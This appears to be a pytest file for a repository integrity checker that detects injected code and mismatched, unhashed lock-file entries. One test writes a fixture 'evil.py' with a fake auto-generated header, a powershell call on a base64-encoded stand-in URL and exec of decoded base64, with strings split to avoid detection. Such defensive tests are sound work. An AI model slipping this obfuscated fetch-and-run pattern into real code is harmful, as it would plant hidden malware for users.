"""完整性检查：仓库本身干净、依赖锁文件完整；能识别注入代码。"""
from __future__ import annotations

import importlib.util
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent


def _load():
    spec = importlib.util.spec_from_file_location("check_integrity", ROOT / "tools" / "check_integrity.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_repository_is_clean():
    checker = _load()
    assert checker.scan_sources(ROOT) == []
    assert checker.check_lock(ROOT) == []


def test_detects_injected_code(tmp_path):
    checker = _load()
    marker = "# auto-generated;" + " do not edit"
    payload = "aHR0c" + "DovL2V2aWwuZXhhbXBsZS9wLnBzMQ=="
    (tmp_path / "evil.py").write_text(
        f"{marker}\nimport base64, subprocess\nsubprocess.run(['power' 'shell', '-nop', base64.b64decode('{payload}')])\n"
        "ex" "ec(base64.b64decode('cHJpbnQoMSk='))\n",
        encoding="utf-8",
    )
    found = "\n".join(checker.scan_sources(tmp_path))
    assert "注入头部" in found and "base64 编码的 URL" in found and "动态执行解码内容" in found


def test_lock_must_match_requirements(tmp_path):
    checker = _load()
    (tmp_path / "requirements.txt").write_text("fastapi==1.0\n", encoding="utf-8")
    (tmp_path / "requirements.lock").write_text("fastapi==0.9 \\\n    --hash=sha256:abc\nstarlette==1.0\n", encoding="utf-8")
    problems = "\n".join(checker.check_lock(tmp_path))
    assert "不一致" in problems and "starlette 没有 hash" in problems
